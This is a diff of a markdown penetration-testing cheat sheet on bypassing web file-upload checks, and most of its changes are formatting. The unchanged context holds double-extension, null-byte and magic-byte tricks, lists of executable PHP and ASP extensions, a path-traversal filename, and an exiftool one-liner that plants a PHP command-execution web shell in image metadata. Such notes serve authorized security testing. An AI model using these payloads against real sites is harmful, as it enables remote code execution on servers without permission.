@@ -15,7 +15,7 @@ Bypassing Normal extension
 Now what we can do is we can upload a file which looks like this something.php.jpg or somethings.jpg.php.
 ```
 
-## Bypassing Magic Byte validation.
+## Bypassing Magic Byte validation
 ```
 Magic Bytes
 Successfully use magic bytes to fool the upload function into thinking php-reverse-shell.php was .pdf:
@@ -39,8 +39,10 @@ so while we have to upload a JPEG file type we actaully can upload a PHAR-JPEG f
 
 And at last Uploading a shell to some random websites for fun is not really cool so don’t ever try untill unless you have the permission to test.
 ```
+
+
+## Bypass file checks for upload
 ```
-Bypass file checks for upload
 - Rename the file
     - php phtml, .php, .php3, .php4, .php5, and .inc
     - asp asp, .aspx
@@ -54,7 +56,6 @@ Bypass file checks for upload
     - NULL BYTE
         - dog.jpg%00
         
-
 - exiftool (inject RCE into metadata comment section)
     > exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
     > mv lo.jpg lo.php.jpg
@@ -64,7 +65,7 @@ Bypass file checks for upload
 ```
 Php not allowed? Trial and error to pass it. 
 
-try | .phps | .php7 
+try .phps , .php7 
 
 PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
 ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
@@ -128,7 +129,7 @@ Other Tricks to check
 Find a vulnerability to rename the file already uploaded (to change the extension).
 ```
 
-##From File upload to other vulnerabilities
+## File upload to other vulnerabilities
 ```
 Path Traversal from File Upload?
 Set filename to ../../../tmp/lol.png and try to achieve a path traversal
